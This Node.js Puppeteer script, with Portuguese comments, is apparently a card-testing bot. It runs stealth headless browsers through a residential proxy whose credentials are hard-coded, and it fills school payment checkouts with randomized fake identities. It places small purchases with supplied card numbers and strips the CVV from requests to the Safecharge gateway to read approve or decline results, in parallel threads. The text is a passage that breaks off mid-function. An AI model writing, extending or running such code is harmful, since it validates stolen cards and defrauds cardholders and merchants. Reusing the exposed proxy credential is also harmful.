const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const fs = require('fs');
const path = require('path');
const ui = require('./ui');

const EXTENSION_PATH = path.join(__dirname, 'extension', 'jiofmdifioeejeilfkpegipdjiopiekl');

const PROXY_HOST = 'la.residential.rayobyte.com';
const PROXY_PORT = '8000';
const PROXY_USER = 'tcristine494_gmail_com';
const PROXY_PASS = '609737heito-country-US';

const AMOUNT = '1';

// Lista de escolas (sites) disponíveis para rotação, lida do sites.json
// Formato de cada entrada: { "url": "...", "site": "Nome no dropdown", "item": "Item no dropdown" }
// O campo "site" é mapeado para "name" internamente para compatibilidade com o resto do código.
const SCHOOLS = (() => {
  try {
    const sitesPath = path.join(__dirname, 'sites.json');
    const data = fs.readFileSync(sitesPath, 'utf-8');
    const parsed = JSON.parse(data);
    return parsed
      .map((s) => ({ url: s.url, name: s.site, item: s.item }))
      .filter((s) => s.url && s.name && s.item);
  } catch (e) {
    console.error('Erro ao ler sites.json:', e.message);
    return [];
  }
})();

// Retorna um site aleatório da lista SCHOOLS
function getRandomSite() {
  if (SCHOOLS.length === 0) {
    throw new Error('Nenhum site configurado em sites.json');
  }
  return SCHOOLS[Math.floor(Math.random() * SCHOOLS.length)];
}

// ===== ROTAÇÃO DE SITES (round-robin embaralhado) =====
// Garante que todos os sites sejam usados antes de repetir, evitando
// "pegar sempre o mesmo site". A cada ciclo, a lista é re-embaralhada.
let siteIndex = 0;
let shuffledSites = [];

function getNextSite() {
  if (SCHOOLS.length === 0) {
    throw new Error('Nenhum site configurado em sites.json');
  }
  if (shuffledSites.length === 0) {
    shuffledSites = [...SCHOOLS].sort(() => Math.random() - 0.5);
  }
  const site = shuffledSites[siteIndex % shuffledSites.length];
  siteIndex++;
  if (siteIndex >= shuffledSites.length) {
    // Reinicia o ciclo embaralhando de novo
    shuffledSites = [...SCHOOLS].sort(() => Math.random() - 0.5);
    siteIndex = 0;
  }
  return site;
}

// Número de threads (browsers em paralelo) - configurável via argumento: node paymentChecker.js 2
const THREADS = Math.max(1, parseInt(process.argv[2], 10) || 3);

const waitForTimeout = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Abre uma nova aba com retry. Quando vários browsers são lançados ao mesmo tempo
// (várias threads em paralelo), o Chrome pode falhar ao criar a aba com
// "Target.createTarget: Failed to open a new tab". Tentamos de novo com backoff.
async function openNewPageWithRetry(browser) {
  let attempts = 0;
  const maxAttempts = 5;
  while (attempts < maxAttempts) {
    try {
      return await browser.newPage();
    } catch (newPageError) {
      attempts++;
      if (attempts >= maxAttempts) {
        throw newPageError;
      }
      console.log(`[${new Date().toISOString()}] Falha ao abrir nova aba (${attempts}/${maxAttempts}), tentando de novo...`);
      await waitForTimeout(500 * attempts);
    }
  }
}

// Lança um browser com retry. Quando várias threads lançam browsers ao mesmo tempo,
// o Chrome pode falhar. Tentamos de novo com backoff.
async function launchBrowserWithRetry(headless = true) {
  let attempts = 0;
  const maxAttempts = 5;
  while (attempts < maxAttempts) {
    try {
      return await puppeteer.launch({
        headless,
        executablePath: '/usr/bin/google-chrome-stable',
        args: [
          `--proxy-server=http://${PROXY_HOST}:${PROXY_PORT}`,
          `--disable-extensions-except=${EXTENSION_PATH}`,
          `--load-extension=${EXTENSION_PATH}`,
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-gpu',
        ],
      });
    } catch (launchError) {
      attempts++;
      if (attempts >= maxAttempts) {
        throw launchError;
      }
      console.log(`[${new Date().toISOString()}] Falha ao lançar browser (${attempts}/${maxAttempts}), tentando de novo...`);
      await waitForTimeout(500 * attempts);
    }
  }
}

// Funções para gerar dados randomizados
const firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Mary', 'Patricia', 'Jennifer', 'Linda', 'Elizabeth', 'Barbara', 'Susan', 'Jessica', 'Sarah', 'Karen'];
const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin'];
const streets = ['Main St', 'Oak Ave', 'Elm St', 'Maple Dr', 'Cedar Ln', 'Pine St', 'Washington Ave', 'Lake St', 'Park Ave', 'Spring St'];
const cities = ['Springfield', 'Franklin', 'Georgetown', 'Madison', 'Clinton', 'Greenville', 'Salem', 'Fairview', 'Washington', 'Arlington'];
const states = ['NY', 'CA', 'TX', 'FL', 'IL', 'PA', 'OH', 'GA', 'NC', 'MI'];

const randomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const randomPhone = () => `${randomInt(200, 999)}${randomInt(200, 999)}${randomInt(1000, 9999)}`;
const randomEmail = (firstName, lastName) => {
  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
  return `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomInt(10, 99)}@${randomItem(domains)}`;
};

const generateRandomContact = () => {
  const firstName = randomItem(firstNames);
  const lastName = randomItem(lastNames);
  const streetNumber = randomInt(1, 999);
  
  return {
    firstName: firstName,
    lastName: lastName,
    street: `${streetNumber} ${randomItem(streets)}`,
    city: randomItem(cities),
    state: randomItem(states),
    zip: String(randomInt(10000, 99999)),
    country: 'US',
    phone: randomPhone(),
    email: randomEmail(firstName, lastName),
  };
};

async function checkCard(cardNumber, expiryMonth, expiryYear, cvv, page = null, browser = null, keepBrowserOpen = false, site = null) {
  const startTime = Date.now();

  // Se não foi passado um site, escolhe um aleatório da lista
  if (!site) {
    site = getRandomSite();
  }

  const cardData = {
    'Card Number': cardNumber,
    'Expiry Month': expiryMonth,
    'Expiry Year': expiryYear,
    'CVV': cvv,
    'Expiry Date': `${expiryMonth}/${expiryYear.slice(-2)}`,
  };

  const CONTACT = generateRandomContact();

  let shouldCloseBrowser = false;

  // Se a página passada estiver inválida/destruída, recria o browser
  if (page && (page.isClosed() || !browser)) {
    try { await browser.close(); } catch (e) {}
    page = null;
    browser = null;
  }

  if (!browser) {
    browser = await launchBrowserWithRetry();
    shouldCloseBrowser = true;
  }

  // Se não estiver reutilizando uma página, abre uma página NOVA explicitamente.
  // Fecha as about:blank iniciais do browser (que causavam abas presas em about:blank
  // quando vários workers rodavam juntos) e usa uma página nova.
  let currentPage = page;
  if (!currentPage) {
    const pages = await browser.pages();
    // Fecha qualquer página que ainda esteja em about:blank (a inicial do browser)
    for (const p of pages) {
      if (p.url() === 'about:blank') {
        try { await p.close(); } catch (e) {}
      }
    }

    // Abre uma página nova com retry (evita "Target.createTarget" quando vários
    // browsers são lançados ao mesmo tempo pelas threads em paralelo).
    currentPage = await openNewPageWithRetry(browser);
  }

  // Autenticação no proxy (só se não for reutilizando)
  if (!page) {
    await currentPage.authenticate({
      username: PROXY_USER,
      password: PROXY_PASS
    });
  }

  // ===== LOOP DE RETRY (até 3 tentativas) =====
  const maxRetries = 3;
  let retryAttempt = 1;
  let finalResult = null;

  while (retryAttempt <= maxRetries && !finalResult) {
    console.log(`[${new Date().toISOString()}] Tentativa ${retryAttempt}/${maxRetries} para cartão ${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}`);

    try {
      finalResult = await executePaymentFlow(currentPage, browser, cardData, CONTACT, retryAttempt, site);
    } catch (error) {
      console.error(`[${new Date().toISOString()}] Erro na tentativa ${retryAttempt}: ${error.message}`);

      // Se a página foi destruída, recria o browser para a próxima tentativa
      if (/página inválida|destroyed|Not attached|removeAllListeners|Execution context/i.test(error.message)) {
        try { await browser.close(); } catch (e) {}
        browser = await launchBrowserWithRetry(true);
        const pages = await browser.pages();
        for (const p of pages) {
          if (p.url() === 'about:blank') {
            try { await p.close(); } catch (e) {}
          }
        }
        currentPage = await openNewPageWithRetry(browser);
        await currentPage.authenticate({
          username: PROXY_USER,
          password: PROXY_PASS
        });
        shouldCloseBrowser = true;
      }

      if (retryAttempt === maxRetries) {
        if (shouldCloseBrowser) {
          await browser.close();
        }
        throw error;
      }
    }

    // Se executePaymentFlow retornou null (timeout de navegação, opção não encontrada,
    // iframe não carregou, sem resposta do gateway, etc.), fecha APENAS a página atual
    // e abre uma nova no MESMO browser. Isso evita acumular páginas sem perder o browser.
    // IMPORTANTE: NÃO muda a URL/site aqui. Quando não há resposta, o retry deve
    // voltar para o início e retestar na MESMA URL, sem trocar de site.
    if (!finalResult) {
      console.log(`[${new Date().toISOString()}] Fluxo retornou null, fechando página atual e abrindo nova...`);
      try { await currentPage.close(); } catch (e) {}
      currentPage = await openNewPageWithRetry(browser);
      await currentPage.authenticate({
        username: PROXY_USER,
        password: PROXY_PASS
      });
    }

    retryAttempt++;
  }

  const endTime = Date.now();
  const duration = ((endTime - startTime) / 1000).toFixed(2);

  // Se todas as tentativas retornaram null (timeout/erro), retorna um resultado de erro
  if (!finalResult) {
    finalResult = {
      status: 'ERROR',
      errorReason: 'Falha após 3 tentativas (timeout/erro de navegação)',
      duration: `${duration}s`,
    };
  } else {
    finalResult.duration = `${duration}s`;
  }

  // Anexa o browser e a página ao resultado para o worker reutilizar no reteste.
  // Fecha o browser apenas quando foi criado aqui E o chamador não pediu para
  // manter aberto. O worker passa keepBrowserOpen=true para o reteste reutilizar a MESMA aba.
  // REGRA: se keepBrowserOpen=true, NUNCA fecha aqui. O server.js fecha APÓS o ciclo de reteste.
  if (shouldCloseBrowser && !keepBrowserOpen) {
    console.log(`[${new Date().toISOString()}] [checkCard] Fechando browser (criado aqui, keepBrowserOpen=false)`);
    await browser.close();
    finalResult.browser = null;
    finalResult.page = null;
  } else {
    console.log(`[${new Date().toISOString()}] [checkCard] Mantendo browser (keepBrowserOpen=${keepBrowserOpen}, shouldCloseBrowser=${shouldCloseBrowser})`);
    finalResult.browser = browser;
    finalResult.page = currentPage;
  }

  return finalResult;
}

async function executePaymentFlow(page, browser, cardData, CONTACT, currentAttempt, site = null) {
  // Se não foi passado um site, escolhe um aleatório
  if (!site) {
    site = getRandomSite();
  }

  // ===== INTERCEPTA AS REQUISIÇÕES E RESPOSTAS =====
  let paymentResponse = null;
  let paymentStatus = null;

  // Guarda: se a página for inválida, lança erro para o retry recriar o browser
  if (!page || page.isClosed()) {
    throw new Error('Página inválida no fluxo de pagamento');
  }

  // Remove listeners antigos se existirem
  page.removeAllListeners('request');
  page.removeAllListeners('response');

  // Habilita a interceptação de requisições
  await page.setRequestInterception(true);

  page.on('request', (request) => {
    const url = request.url();
    
    // Intercepta a requisição de pagamento para remover o CVV
    if (url === 'https://secure.safecharge.com/ppp/api/v1/clientPayment.do') {
      const postData = request.postData();
      if (postData) {
        try {
          const data = JSON.parse(postData);
          
          // Remove o campo CVV do objeto card (estrutura: paymentOption.card.CVV)
          if (data.paymentOption && data.paymentOption.card && data.paymentOption.card.CVV) {
            delete data.paymentOption.card.CVV;
            
            const modifiedData = JSON.stringify(data);
            request.continue({ postData: modifiedData });
            return;
          }
        } catch (error) {
          // Se falhar ao parsear, continua com o request original
        }
      }
    }
    
    request.continue();
  });

  page.on('response', async (response) => {
    const url = response.url();
    
    // Intercepta APENAS a resposta do gateway de pagamento
    if (url === 'https://secure.safecharge.com/ppp/api/v1/clientPayment.do') {
      try {
        const text = await response.text();
        const data = JSON.parse(text);
        paymentResponse = data;
        paymentStatus = data.transactionStatus || data.status;

        // Mostra apenas os campos relevantes
        const relevantFields = {
          gwErrorCode: data.gwErrorCode,
          gwErrorReason: data.gwErrorReason,
          transactionStatus: data.transactionStatus
        };
        console.log(`[${new Date().toISOString()}] Resposta do pagamento:`, JSON.stringify(relevantFields));
      } catch (error) {
        console.error(`[${new Date().toISOString()}] Erro ao parsear resposta do pagamento:`, error.message);
      }
    }
  });

  try {
    // Detecta se a tela de pagamento já está presente (campo #ccNameOnCard visível).
    // Se estiver, não navega de novo — entra direto no preenchimento do cartão.
    // Isso evita recarregar quando a aba já está na tela de pagamento.
    const formAlreadyPresent = await page.evaluate(() => {
      const nameField = Array.from(document.querySelectorAll('#ccNameOnCard')).some(el => {
        const r = el.getBoundingClientRect();
        return r.width > 0 && r.height > 0;
      });
      const iframeReady = !!document.querySelector('#ccCardNumber iframe');
      return nameField && iframeReady;
    }).catch(() => false);

    if (formAlreadyPresent) {
      console.log(`[${new Date().toISOString()}] Tela de pagamento já presente, pulando navegação`);
    } else {
      // Se for a primeira tentativa OU estiver reutilizando aba OU a página estiver
      // em about:blank (recriada após retorno ao início), vai para a página inicial.
      // Se for retry numa página já carregada, recarrega a página.
      await page.goto(site.url, {
        waitUntil: 'domcontentloaded',
        timeout: 45000,
      });

      // Log da URL após navegação para diagnóstico
      console.log(`[${new Date().toISOString()}] URL após goto: ${page.url()}`);

      // Retorna o ElementHandle REALMENTE visível
      const getVisibleHandle = async (selector) => {
        const handles = await page.$$(selector);
        for (let i = 0; i < handles.length; i++) {
          const box = await handles[i].boundingBox();
          if (box && box.width > 0 && box.height > 0) {
            return handles[i];
          }
        }
        return null;
      };

      const selectByText = async (selector, text) => {
        const handle = await getVisibleHandle(selector);
        if (!handle) throw new Error(`Nenhum ${selector} visível encontrado`);

        const value = await handle.evaluate((el, txt) => {
          const option = Array.from(el.options).find((o) =>
            o.textContent.toLowerCase().includes(txt.toLowerCase())
          );
          return option ? option.value : null;
        }, text);

        if (value === null) {
          // Log das opções disponíveis para diagnóstico
          const availableOptions = await handle.evaluate((el) =>
            Array.from(el.options).map((o) => o.textContent.trim())
          );
          console.log(`[${new Date().toISOString()}] Opções disponíveis em ${selector}:`, JSON.stringify(availableOptions));
          throw new Error(`Opção "${text}" não encontrada em ${selector}`);
        }

        await handle.click();
        await handle.select(value);
        await handle.evaluate((el) => el.blur());

        const currentValue = await handle.evaluate((el) => el.value);
        return currentValue;
      };

      // 1) Escola
      await page.waitForFunction(
        () => {
          const els = Array.from(document.querySelectorAll('#site'));
          return els.some((el) => {
            const r = el.getBoundingClientRect();
            return r.width > 0 && r.height > 0;
          });
        },
        { timeout: 60000 }
      );
      await selectByText('#site', site.name);

      // 2) Espera o #item carregar via AJAX
      await page.waitForFunction(
        () => {
          const els = Array.from(document.querySelectorAll('#item'));
          const visible = els.find((el) => {
            const r = el.getBoundingClientRect();
            return r.width > 0 && r.height > 0;
          });
          return visible && visible.options.length > 1;
        },
        { timeout: 60000 }
      );

      await selectByText('#item', site.item);

      // 3) Amount
      await page.waitForFunction(
        () => {
          const els = Array.from(document.querySelectorAll('#amount'));
          const visible = els.find((el) => {
            const r = el.getBoundingClientRect();
            return r.width > 0 && r.height > 0;
          });
          return visible && !visible.disabled;
        },
        { timeout: 60000 }
      );

      const amountHandle = await getVisibleHandle('#amount');
      await amountHandle.click({ clickCount: 3 });
      await amountHandle.type(AMOUNT, { delay: 5 });
      await amountHandle.evaluate((el) => el.blur());

      // 4) Buy
      await page.waitForFunction(
        () => {
          const buttons = Array.from(document.querySelectorAll('button'));
          return buttons.some((b) => {
            const r = b.getBoundingClientRect();
            return b.textContent.trim() === 'Buy' && !b.disabled && r.width > 0 && r.height > 0;
          });
        },
        { timeout: 15000 }
      );

      const buttons = await page.$$('button');
      for (const btn of buttons) {
        const info = await btn.evaluate((b) => ({
          text: b.textContent.trim(),
          disabled: b.disabled,
        }));
        if (info.text === 'Buy' && !info.disabled) {
          const box = await btn.boundingBox();
          if (box && box.width > 0) {
            await btn.click();
            break;
          }
        }
      }

      // ===== 5) Clica no link "Cart" pra ir pra /cart =====
      await page.waitForFunction(
        () => {
          const els = Array.from(document.querySelectorAll('a.btn-success[href="/cart"]'));
          return els.some((el) => {
            const r = el.getBoundingClientRect();
            return r.width > 0 && r.height > 0;
          });
        },
        { timeout: 15000 }
      );
      const cartHandle = await getVisibleHandle('a.btn-success[href="/cart"]');
      if (!cartHandle) throw new Error('Link do Cart não encontrado visível.');
      await cartHandle.click();

      await page.waitForFunction(
        () => window.location.pathname.includes('/cart'),
        { timeout: 20000 }
      );

      // ===== 6) Clica no botão/link "Pay" que leva pra /customer =====
      const payHandle = await getVisibleHandle('a[href="/customer"]');
      if (!payHandle) throw new Error('Link "Pay" (/customer) não encontrado visível no carrinho.');
      await payHandle.click();

      await page.waitForFunction(
        () => window.location.pathname.includes('/customer'),
        { timeout: 20000 }
      );

      // ===== 7) Preenche o formulário de contato =====
      const fillByAriaLabel = async (label, value) => {
        const handle = await getVisibleHandle(`input[aria-label="${label}"]`);
        if (!handle) throw new Error(`Campo "${label}" não encontrado visível.`);
        await handle.click({ clickCount: 3 });
        await handle.type(value, { delay: 5 }); // Digitação rápida
        await handle.evaluate((el) => el.blur());
        await waitForTimeout(20); // Delay reduzido entre campos
      };

      const selectByAriaLabelValue = async (label, value) => {
        const handle = await getVisibleHandle(`select[aria-label="${label}"]`);
        if (!handle) throw new Error(`Select "${label}" não encontrado visível.`);
        await handle.click();
        await handle.select(value);
        await handle.evaluate((el) => el.blur());
        await waitForTimeout(20); // Delay reduzido entre campos
      };

      await fillByAriaLabel('First Name', CONTACT.firstName);
      await fillByAriaLabel('Last Name', CONTACT.lastName);
      await fillByAriaLabel('Street', CONTACT.street);
      await fillByAriaLabel('City', CONTACT.city);
      await selectByAriaLabelValue('State', CONTACT.state);
      await fillByAriaLabel('Zip', CONTACT.zip);
      await selectByAriaLabelValue('Country', CONTACT.country);
      await fillByAriaLabel('Phone', CONTACT.phone);
      await fillByAriaLabel('Email', CONTACT.email);

      // ===== 8) CLICA NO LINK "Pay" COM CLASSE "btn btn-primary w-100" =====
      await page.waitForFunction(
        () => {
          const links = Array.from(document.querySelectorAll('a.btn.btn-primary.w-100'));
          return links.some((el) => {
            const r = el.getBoundingClientRect();
            const text = el.textContent.trim().toLowerCase();
            return (text === 'pay' || text.includes('pay')) && r.width > 0 && r.height > 0;
          });
        },
        { timeout: 15000 }
      );

      const payLinks = await page.$$('a.btn.btn-primary.w-100');
      let payClicked = false;

      for (const link of payLinks) {
        const info = await link.evaluate((el) => ({
          text: el.textContent.trim().toLowerCase(),
          href: el.getAttribute('href'),
          className: el.className
        }));

        if ((info.text === 'pay' || info.text.includes('pay')) && info.href === '/pay') {
          const box = await link.boundingBox();
          if (box && box.width > 0 && box.height > 0) {
            await link.evaluate((el) => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
            await waitForTimeout(500);

            await link.click();
            payClicked = true;
            break;
          }
        }
      }

      if (!payClicked) {
        const fallbackLink = await getVisibleHandle('a[href="/pay"]');
        if (fallbackLink) {
          await fallbackLink.click();
          payClicked = true;
        }
      }

      if (payClicked) {
        await waitForTimeout(5000);
        await waitForTimeout(200); // Delay extra antes de preencher cartão
      }
    }

    // ===== 9) PREENCHE OS DADOS DO CARTÃO =====
    // (executa tanto no fluxo completo quanto no reuso de aba)

    // Aguarda o iframe do cartão carregar (timeout reduzido para detectar bug rápido)
      try {
        await page.waitForFunction(
          () => {
            const iframe = document.querySelector('#ccCardNumber iframe');
            return iframe && iframe.contentWindow;
          },
          { timeout: 10000 }
        );
      } catch (error) {
        console.log(`[${new Date().toISOString()}] Iframe do cartão não carregou, recarregando página...`);
        try {
          await page.goto(site.url, { waitUntil: 'domcontentloaded', timeout: 45000 });
        } catch (reloadError) {
          console.log(`[${new Date().toISOString()}] Reload falhou: ${reloadError.message}`);
        }
        return null;
      }
      
      // Função para preencher campos dentro do iframe
      const fillIframeField = async (iframeSelector, fieldSelector, value) => {
        try {
          const iframeElement = await page.waitForSelector(iframeSelector, { timeout: 10000 });
          const frame = await iframeElement.contentFrame();
          
          if (!frame) {
            throw new Error(`Não foi possível acessar o iframe: ${iframeSelector}`);
          }
          
          await frame.waitForSelector(fieldSelector, { timeout: 10000 });
          
          await frame.click(fieldSelector, { clickCount: 3 });
          await frame.type(fieldSelector, value, { delay: 5 }); // Digitação rápida
          await frame.evaluate((sel) => {
            const el = document.querySelector(sel);
            if (el) el.blur();
          }, fieldSelector);
          
        } catch (error) {
          throw error;
        }
      };
      
      // Preenche o nome do titular (usa nome randomizado do CONTACT)
      const cardholderName = `${CONTACT.firstName} ${CONTACT.lastName}`;

      await page.evaluate((name) => {
        const input = document.querySelector('#ccNameOnCard');
        if (input) {
          input.value = name;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
        }
      }, cardholderName);
      
      // Preenche o número do cartão (iframe)
      await fillIframeField('#ccCardNumber iframe', 'input', cardData['Card Number']);
      
      // Preenche a data de validade (iframe)
      await fillIframeField('#ccExpYear iframe', 'input', cardData['Expiry Date']);
      
      // Preenche o CVV (iframe)
      await fillIframeField('#ccCVV iframe', 'input', cardData['CVV']);
      
      // ===== 10) CLICA NO BOTÃO PAY FINAL =====

      // Aguarda o botão Pay ficar visível
      await page.waitForFunction(
        () => {
          const buttons = Array.from(document.querySelectorAll('button'));
          return buttons.some((b) => {
            const text = b.textContent.trim().toLowerCase();
            const r = b.getBoundingClientRect();
            return (text === 'pay' || text.includes('pay')) &&
                   !b.disabled &&
                   r.width > 0 &&
                   r.height > 0;
          });
        },
        { timeout: 15000 }
      );

      // Delay antes de clicar no Pay final (1s normal e reteste)
      await waitForTimeout(1000);

      // Encontra e clica no botão Pay
      const allButtons = await page.$$('button');
      let finalPayClicked = false;
      
      for (const btn of allButtons) {
        const info = await btn.evaluate((b) => ({
          text: b.textContent.trim().toLowerCase(),
          disabled: b.disabled,
          type: b.type
        }));
        
        if ((info.text === 'pay' || info.text.includes('pay')) && !info.disabled) {
          const box = await btn.boundingBox();
          if (box && box.width > 0 && box.height > 0) {
            await btn.evaluate((el) => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
            await waitForTimeout(500);
            
            await btn.click();
            finalPayClicked = true;
            break;
          }
        }
      }
      
      if (finalPayClicked) {
        // Aguarda a resposta da requisição de pagamento (máximo 30 segundos).
        // SÓ retorna DECLINED se a resposta do gateway (paymentResponse) chegar.
        // Se não houver resposta, retorna null para o retry tentar de novo.
        let attempts = 0;
        const maxAttempts = 30;

        while (attempts < maxAttempts) {
          // Só verifica retorno ao início após 3 segundos (para não detectar falso positivo)
          if (attempts >= 3) {
            // Verifica se voltou para a página inicial (campo #site apareceu novamente).
            // Quando o site buga ao clicar em Pay e volta pro início, detectamos aqui
            // e retornamos null para o retry refazer o fluxo corretamente.
            const schoolFieldVisible = await page.evaluate(() => {
              const els = Array.from(document.querySelectorAll('#site'));
              return els.some((el) => {
                const r = el.getBoundingClientRect();
                return r.width > 0 && r.height > 0;
              });
            }).catch(() => false);

            if (schoolFieldVisible) {
              console.log(`[${new Date().toISOString()}] Detectou retorno ao início (campo escola visível), iniciando retry rápido`);
              return null; // Retorna null para retry imediato
            }
          }

          if (paymentStatus) {
            break;
          }
          await waitForTimeout(1000);
          attempts++;
        }
      }

    // ===== ANALISA O RESULTADO DA TRANSAÇÃO =====
    let result = {
      status: 'unknown',
      errorCode: null,
      errorReason: null
    };

    if (paymentResponse) {
      const status = paymentResponse.transactionStatus || paymentResponse.status || paymentResponse.result;
      const errorCode = paymentResponse.gwErrorCode || paymentResponse.errorCode || paymentResponse.code;
      const errorReason = paymentResponse.gwErrorReason || paymentResponse.errorReason || paymentResponse.reason || paymentResponse.message;

      result = {
        status: status,
        errorCode: errorCode || null,
        errorReason: errorReason || null
      };
    } else {
      // Se não houve resposta, retorna null para indicar retry
      return null;
    }

    return result;

  } catch (error) {
    // Se erro, retorna null para indicar retry
    console.error(`Erro no fluxo de pagamento: ${error.message}`);
    return null;
  }
}

// ===== RETESTE NA MESMA ABA =====
// Reutiliza a página já na tela de pagamento, troca os dados do cartão e clica em Pay novamente.
// Se a página não estiver na tela de pagamento (ex: voltou ao início), refaz o fluxo completo
// até a tela de pagamento antes de preencher o cartão.
async function retestCard(page, browser, cardNumber, expiryMonth, expiryYear, cvv, site = null) {
  const cardData = {
    'Card Number': cardNumber,
    'Expiry Month': expiryMonth,
    'Expiry Year': expiryYear,
    'CVV': cvv,
    'Expiry Date': `${expiryMonth}/${expiryYear.slice(-2)}`,
  };

  // Novo contato randomizado para o reteste
  const CONTACT = generateRandomContact();

  // ===== RECONFIGURA INTERCEPTAÇÃO DE REQUISIÇÕES/RESPOSTAS =====
  let paymentResponse = null;
  let paymentStatus = null;

  // Guarda: se a página não for válida, retorna erro para o fluxo recriar o browser
  if (!page || page.isClosed()) {
    return { status: 'ERROR', errorReason: 'Página inválida para reteste' };
  }

  // Se não foi passado um site, escolhe um aleatório
  if (!site) {
    site = getRandomSite();
  }

  // Verifica se a página está na tela de pagamento (tem o campo do cartão).
  // Se não estiver (ex: voltou ao início), refaz o fluxo completo até a tela de pagamento.
  const onPaymentScreen = await page.evaluate(() => {
    return !!document.querySelector('#ccNameOnCard');
  }).catch(() => false);

  if (!onPaymentScreen) {
    // Tenta voltar para a tela de pagamento navegando diretamente para /pay,
    // em vez de refazer o fluxo completo do zero (mais rápido e evita erros).
    console.log(`[${new Date().toISOString()}] Página não está na tela de pagamento, tentando voltar para /pay...`);
    try {
      const baseUrl = site.url.replace(/\/+$/, '');
      await page.goto(baseUrl + '/pay', { waitUntil: 'domcontentloaded', timeout: 30000 });
      const stillOnPayment = await page.evaluate(() => !!document.querySelector('#ccNameOnCard')).catch(() => false);
      if (stillOnPayment) {
        onPaymentScreen = true;
      }
    } catch (e) {
      console.log(`[${new Date().toISOString()}] Falha ao voltar para /pay: ${e.message}`);
    }

    if (!onPaymentScreen) {
      console.log(`[${new Date().toISOString()}] /pay não funcionou, refazendo fluxo completo para reteste...`);
      // Refaz o fluxo completo até a tela de pagamento com este cartão
      const flowResult = await executePaymentFlow(page, browser, cardData, CONTACT, 1, site);
      if (flowResult && flowResult.status && flowResult.status !== 'unknown') {
        return flowResult;
      }
      return { status: 'ERROR', errorReason: 'Falha ao refazer fluxo para reteste' };
    }
  }

  page.removeAllListeners('request');
  page.removeAllListeners('response');

  await page.setRequestInterception(true);

  page.on('request', (request) => {
    const url = request.url();
    if (url === 'https://secure.safecharge.com/ppp/api/v1/clientPayment.do') {
      const postData = request.postData();
      if (postData) {
        try {
          const data = JSON.parse(postData);
          if (data.paymentOption && data.paymentOption.card && data.paymentOption.card.CVV) {
            delete data.paymentOption.card.CVV;
            request.continue({ postData: JSON.stringify(data) });
            return;
          }
        } catch (error) {
          // continua com request original
        }
      }
    }
    request.continue();
  });

  page.on('response', async (response) => {
    const url = response.url();
    if (url === 'https://secure.safecharge.com/ppp/api/v1/clientPayment.do') {
      try {
        const text = await response.text();
        const data = JSON.parse(text);
        paymentResponse = data;
        paymentStatus = data.transactionStatus || data.status;
      } catch (error) {
        // silencioso
      }
    }
  });

  try {
    // Delay de 300ms antes de começar a digitar os dados do cartão,
    // para garantir que a página esteja pronta e evitar quebrar o fluxo
    await waitForTimeout(300);

    // Preenche o nome do titular (novo contato)
    // Limpa o campo antes para garantir que o valor anterior não fique
    const cardholderName = `${CONTACT.firstName} ${CONTACT.lastName}`;
    await page.evaluate((name) => {
      const input = document.querySelector('#ccNameOnCard');
      if (input) {
        input.value = '';
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
        input.value = name;
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
      }
    }, cardholderName);

    // Preenche os campos dentro dos iframes
    const fillIframeField = async (iframeSelector, fieldSelector, value) => {
      const iframeElement = await page.waitForSelector(iframeSelector, { timeout: 10000 });
      const frame = await iframeElement.contentFrame();
      if (!frame) throw new Error(`Não foi possível acessar o iframe: ${iframeSelector}`);
      await frame.waitForSelector(fieldSelector, { timeout: 10000 });
      await frame.click(fieldSelector, { clickCount: 3 });
      await frame.type(fieldSelector, value, { delay: 5 });
      await frame.evaluate((sel) => {
        const el = document.querySelector(sel);
        if (el) el.blur();
      }, fieldSelector);
    };

    await fillIframeField('#ccCardNumber iframe', 'input', cardData['Card Number']);
    await fillIframeField('#ccExpYear iframe', 'input', cardData['Expiry Date']);
    await fillIframeField('#ccCVV iframe', 'input', cardData['CVV']);

    // Clica no botão Pay final
    await page.waitForFunction(
      () => {
        const buttons = Array.from(document.querySelectorAll('button'));
        return buttons.some((b) => {
          const text = b.textContent.trim().toLowerCase();
          const r = b.getBoundingClientRect();
          return (text === 'pay' || text.includes('pay')) && !b.disabled && r.width > 0 && r.height > 0;
        });
      },
      { timeout: 15000 }
    );

    const allButtons = await page.$$('button');
    let payClicked = false;
    for (const btn of allButtons) {
      const info = await btn.evaluate((b) => ({
        text: b.textContent.trim().toLowerCase(),
        disabled: b.disabled,
      }));
      if ((info.text === 'pay' || info.text.includes('pay')) && !info.disabled) {
        const box = await btn.boundingBox();
        if (box && box.width > 0 && box.height > 0) {
          await btn.evaluate((el) => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
          await waitForTimeout(500);
          await btn.click();
          payClicked = true;
          break;
        }
      }
    }

    if (!payClicked) {
      return { status: 'ERROR', errorReason: 'Botão Pay não encontrado no reteste' };
    }

    // Aguarda a resposta do pagamento (máx 30s)
    let attempts = 0;
    while (attempts < 30) {
      // Só verifica retorno ao início após 3 segundos (para não detectar falso positivo)
      if (attempts >= 3) {
        // Verifica se voltou para a página inicial (campo #site apareceu novamente).
        // Quando o site buga ao clicar em Pay e volta pro início, detectamos aqui
        // e retornamos RETRY para o worker refazer o fluxo corretamente.
        const schoolFieldVisible = await page.evaluate(() => {
          const els = Array.from(document.querySelectorAll('#site'));
          return els.some((el) => {
            const r = el.getBoundingClientRect();
            return r.width > 0 && r.height > 0;
          });
        }).catch(() => false);

        if (schoolFieldVisible) {
